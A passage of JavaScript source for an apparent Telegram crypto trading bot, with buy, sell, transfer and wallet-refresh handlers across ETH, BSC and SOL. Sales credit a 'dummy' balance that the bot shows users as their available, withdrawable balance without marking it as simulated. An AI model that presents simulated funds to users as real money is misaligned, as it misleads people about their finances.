          Markup.button.callback('BSC (BNB)', 'buy_chain:bsc'),
          Markup.button.callback('SOL', 'buy_chain:sol'),
        ],
        [Markup.button.callback('❌ Cancel', 'buy_cancel')],
      ]),
    }
  );
});

bot.action('buy_start', async (ctx) => {
  await ctx.answerCbQuery();
  const user = db.getUser(ctx.from.id);
  if (!user) return ctx.reply('Send /start first to create your wallets.');
  ctx.session.awaiting = null;
  ctx.session.buy = {};
  await ctx.reply(
    '🟢 *Buy*\n\nSelect the chain to trade on:',
    {
      parse_mode: 'Markdown',
      ...Markup.inlineKeyboard([
        [
          Markup.button.callback('ETH', 'buy_chain:eth'),
          Markup.button.callback('BSC (BNB)', 'buy_chain:bsc'),
          Markup.button.callback('SOL', 'buy_chain:sol'),
        ],
        [Markup.button.callback('❌ Cancel', 'buy_cancel')],
      ]),
    }
  );
});

bot.action('withdraw_from_wallet', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply('Use /withdraw to start a withdrawal.');
});

bot.action(/^buy_chain:(eth|bsc|sol)$/, async (ctx) => {
  await ctx.answerCbQuery();
  const chain = ctx.match[1];
  const label = chain === 'bsc' ? 'BNB' : chain.toUpperCase();
  const balances = db.getDummyBalances(ctx.from.id) || { eth: 0, bsc: 0, sol: 0 };
  const bal = Number(balances[chain] ?? 0);

  ctx.session.buy = { chain };
  ctx.session.awaiting = 'buy_token';

  await ctx.reply(
    `🟢 *Buy on ${label}*\n\nAvailable balance: *$${bal.toFixed(2)}*\n\n` +
      'Send the *token contract address* (or token mint on Solana) you want to buy:',
    {
      parse_mode: 'Markdown',
      ...Markup.inlineKeyboard([[Markup.button.callback('❌ Cancel', 'buy_cancel')]]),
    }
  );
});

bot.action('buy_cancel', async (ctx) => {
  await ctx.answerCbQuery();
  ctx.session.awaiting = null;
  ctx.session.buy = null;
  await ctx.reply('❌ Buy cancelled.', mainMenu);
});



// ---------- Sell open position → credit chain dummy balance ----------

bot.action('wallet_refresh', async (ctx) => {
  await ctx.answerCbQuery('Refreshing...');
  const user = db.getUser(ctx.from.id);
  if (!user) return ctx.reply('Send /start first to create your wallets.');
  try {
    const overview = await formatWalletOverview(user);
    await ctx.reply(overview.text, {
      parse_mode: 'Markdown',
      ...walletKeyboard(overview.positions),
    });
  } catch (err) {
    console.error('wallet_refresh error:', err);
    await ctx.reply('Refresh failed: ' + (err.message || String(err)));
  }
});

bot.action('transfer_start', async (ctx) => {
  await ctx.answerCbQuery();
  const user = db.getUser(ctx.from.id);
  if (!user) return ctx.reply('Send /start first to create your wallets.');

  ctx.session.awaiting = null;
  ctx.session.withdraw = {};

  await ctx.reply(
    '↔️ *Transfer*\n\nSelect the chain to transfer from:',
    {
      parse_mode: 'Markdown',
      ...Markup.inlineKeyboard([
        [
          Markup.button.callback('ETH', 'withdraw_chain:eth'),
          Markup.button.callback('BSC (BNB)', 'withdraw_chain:bsc'),
          Markup.button.callback('SOL', 'withdraw_chain:sol'),
        ],
        [Markup.button.callback('❌ Cancel', 'withdraw_cancel')],
      ]),
    }
  );
});

bot.action(/^pos_sell:(\d+)$/, async (ctx) => {
  await ctx.answerCbQuery();
  const posId = Number(ctx.match[1]);
  const pos = db.getPosition(posId);
  if (!pos || !pos.active) {
    return ctx.reply('Position not found or already closed.');
  }
  if (Number(pos.telegram_id) !== Number(ctx.from.id)) {
    return ctx.reply('That position is not yours.');
  }

  await ctx.reply('Getting live price and selling...');
  try {
    const enriched = await enrichPositions([pos]);
    const p = enriched[0];
    const saleUsd = Number(p.currentValue) || 0;
    const chain = String(pos.chain).toLowerCase();
    const balances = db.getDummyBalances(ctx.from.id) || { eth: 0, bsc: 0, sol: 0 };
    const prev = Number(balances[chain] ?? 0);
    const next = prev + saleUsd;
    db.setDummyBalance(ctx.from.id, chain, next);
    db.closePosition(posId);

    const label = chain === 'bsc' ? 'BNB' : chain.toUpperCase();
    const sign = p.pnl >= 0 ? '+' : '';
    await ctx.reply(
      'Sold ' + (p.symbol || pos.token_symbol || 'TOKEN') + '\n\n' +
      'Chain: ' + label + '\n' +
      'Sale value: $' + saleUsd.toFixed(2) + '\n' +
      'PnL: ' + sign + '$' + Number(p.pnl).toFixed(2) + ' (' + sign + Number(p.pnlPct).toFixed(1) + '%)\n\n' +
      label + ' balance: $' + prev.toFixed(2) + ' -> $' + next.toFixed(2) + '\n\n' +
      'You can /withdraw this balance as usual.',
      mainMenu
    );
  } catch (err) {
    console.error('pos_sell error:', err);
    await ctx.reply('Sell failed: ' + (err.message || String(err)));
  }
});

bot.catch((err, ctx) => {
  console.error(`Error for ${ctx.updateType}:`, err);
});

bot.launch().then(async () => {
  await bot.telegram.setMyCommands([
    { command: 'start', description: 'Start the bot' },
    { command: 'help', description: 'View the bot guide' },
    { command: 'wallet', description: 'View your wallet' },
    { command: 'buy', description: 'Buy a token' },
    { command: 'withdraw', description: 'Withdraw your funds' },
    { command: 'settings', description: 'Open settings' },
  ]);
  console.log('Bot is running.');
  startAutoDepositScheduler(bot);
});

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
